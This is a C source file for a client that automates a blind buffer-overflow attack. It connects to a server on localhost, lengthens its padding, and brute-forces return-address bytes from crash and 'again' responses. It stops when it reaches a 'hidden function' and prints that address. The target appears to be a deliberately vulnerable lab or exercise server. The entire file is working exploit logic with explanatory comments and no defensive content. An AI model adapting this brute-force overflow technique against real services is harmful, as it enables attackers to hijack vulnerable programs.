#include <stdio.h>
#include <netdb.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>

// number of bytes of memory address to find
#define MAGICNUMBER 4
// length of attack string (padding + return address)
// may require tuning depending on OS
#define MINIMUM 24
// whether to print out debug information
#define DEBUG 0

int main(int argc, char* argv[]) {
  struct hostent *server;
  unsigned char buffer[256], progress[4] = {'/', '-', '\\', '|'};
  struct sockaddr_in serv_addr;
  static volatile unsigned char atkStr[256];
  int count = 1, i, j = 0, offset, sockfd, portno = 54321, n, closingIn = 0,
      *yes, number, segfault = 0, correct = 0, requests = 0, again = 0;

    // standard socket programing: open socket to address and port
    // zero out the buffer that will be used and connect
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int));
    if (sockfd < 0) {
      perror("ERROR opening socket");
      close(sockfd);
      exit(0);
    }
    server = gethostbyname("localhost");
    if (server == NULL) {
      fprintf(stderr, "ERROR, no such host\n");
      exit(-1);
    }
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    bcopy((char *)server->h_addr, (char *)&serv_addr.sin_addr.s_addr, server->h_length);
    serv_addr.sin_port = htons(portno);
    if (connect(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) {
      perror("ERROR connecting");
      exit(-1);
    }

  while (1) {
    bzero(buffer, 256); // zero out the buffer
    if (argc == 2) {
      count = 0;
      for (i = 0; argv[1][i] != ' '; i++) {
        count *= 10;
        count += (argv[1][i] - '0');
      }
      for (j = 0; j < count; j++) {
        number = 0;
        while ((argv[1][i] < '0') || (argv[1][i] > '9')) {
          i++;
        }
        while ((argv[1][i] >= '0') && (argv[1][i] <= '9')) {
          number *= 10;
          number += (argv[1][i] - '0');
          i++;
        }
        atkStr[j] = number;
      }
      argc = 0;
    } // legacy code to generate inital attack string
    sprintf((char*) buffer, "%d ", count);
    offset = (strchr((char*) buffer, ' ') - (char*) buffer) + 1;
    for (i = 0; i < count; i++) {
      buffer[offset + i] = atkStr[i];
    }
    n = write(sockfd, buffer, offset + count);
    // write buffer to socket
    if (n < 0) {
      perror("ERROR writing to socket");
      close(sockfd);
      exit(0);
    }
    requests++; // keep track of the number of attempts
    bzero(buffer, 256);
    n = read(sockfd, buffer, 255);
    // zero out buffer and read response from server
    if (n < 0) {
      perror("ERROR reading from socket");
      close(sockfd);
      exit(0);
    }
    if (DEBUG) {
      printf("%s\n", buffer);
    }
    if (strstr((char*) buffer, "inished") > 0) {
      // if the server responds that the operation finished successfully
      if (segfault) {
        // if the client guessed multiple values for this byte
        // it may indicate that the current byte is part of a memory address
        correct++;
        segfault = 0;
      } else {
        // otherwise, the return address is not at this location
        correct = 0;
      }
      if (count >= MINIMUM) {
        // when the attack string is long enough,
        // start closing in on the hidden function
        closingIn = 1;
      }
      if (closingIn || (correct >= MAGICNUMBER)) {
        if (DEBUG) {
          printf("\rcheckpoint: ");
          for (i = 0; i < count; i++) {
            printf("[%u]", atkStr[i]);
          }
          printf("\n");
        }
        // if closing in on hidden function, decrement the
        // least significant byte of the return address
        if (count >= MINIMUM) {
          atkStr[count - MAGICNUMBER] = atkStr[count - MAGICNUMBER] - 1;
          closingIn = 1;
        } else {
          // otherwise, add another byte to the attack string
          atkStr[count] = 0;
          count++;
        }
      } else {
        // otherwise, add another byte to the attack string
        atkStr[count] = 0;
        count++;
      }
    } else if (strstr((char*) buffer, "gain") > 0) {
      // server requests that client resend the previous string
      if (again > 5) {
        // if client receives again response more than 5 times, change string
        if (closingIn) {
          // if closing in, increment least significant byte and handle "overflow"
          if (0 == atkStr[count - MAGICNUMBER]) {
            if (0 == atkStr[count - (MAGICNUMBER - 1)]) {
              if (atkStr[count - (MAGICNUMBER - 2)] == 0) {
                correct++; // incremet number of correct (does this matter?)
                // because this byte is no longer zero
              }
              atkStr[count - (MAGICNUMBER - 2)] = atkStr[count - (MAGICNUMBER - 2)] + 1;
            }
            if (atkStr[count - (MAGICNUMBER - 1)] == 0) {
              correct++;
            }
            atkStr[count - (MAGICNUMBER - 1)] = atkStr[count - (MAGICNUMBER - 1)] + 1;
          }
          atkStr[count - MAGICNUMBER] = atkStr[count - MAGICNUMBER] + 1;
        } else {
          // if not closing in, just increment last byte of the string
          atkStr[count - 1] = atkStr[count - 1] + 1;
        }
        again = 0; // reset the again counter
      } else {
        // otherwise, update the again counter
        again++;
      }
    } else if (strstr((char*) buffer, "idden") > 0) {
      // if the hidden function is accessed,
      // print out the return address in binary

/*
      printf("\bAttack String: ");
      for (i = 0; i < count; i++) {
        printf("[%u]", atkStr[i]);
      }
      printf("\nRequests: %d\n", requests);
*/
      unsigned int address = (atkStr[count - 1]  << 24) | (atkStr[count - 2]  << 16) | (atkStr[count - 3] << 8) | atkStr[count - 4];
      char binary[33] = {0};
      unsigned int mask;
      for (mask = 2147483648; mask > 0; mask >>=1) {
        strcat(binary, ((address & mask) == mask) ? "1" : "0");
      } // convert to binary
      binary[32] = '\0';
      //printf("%c %c %c\n", binary[0], binary[1], binary[2]);
      printf("%s\n", binary);
      close(sockfd);
      return 0;
    } else {
      // for any other signal, consider it a segfault
      // and modify the attack string as usual
      segfault = 1;
      if (closingIn == 1) {
        if (0 == atkStr[count - MAGICNUMBER]) {
          if (0 == atkStr[count - (MAGICNUMBER - 1)]) {
            atkStr[count - (MAGICNUMBER - 2)] = atkStr[count - (MAGICNUMBER - 2)] - 1;
          }
          atkStr[count - (MAGICNUMBER - 1)] = atkStr[count - (MAGICNUMBER - 1)] - 1;
        }
        atkStr[count - MAGICNUMBER] = atkStr[count - MAGICNUMBER] - 1;
      } else {
        if (atkStr[count - 1] == 255) {
          if (atkStr[count - 2] == 0) {
            correct++;
          } else if (atkStr[count - 2] == 255) {
            if (atkStr[count - 3] == 0) {
              correct++;
            }
            atkStr[count - 3] = atkStr[count - 3] + 1;
          }
          atkStr[count - 2] = atkStr[count - 2] + 1;
        }
        atkStr[count - 1] = atkStr[count - 1] + 1;
      }
    }

    if (DEBUG) {
      if (0 == atkStr[count]) {
        printf("                      \r%c", progress[j++ % 4]);
        fflush(stdout);
        if (j > 3) {
          j = 0;
        }
      }
    } // print a character indicating that progress is being made
    usleep(800);
  } // loop forever
  printf("done\n");
  close(sockfd); // close the connection to the server
  return 0;
} // main()
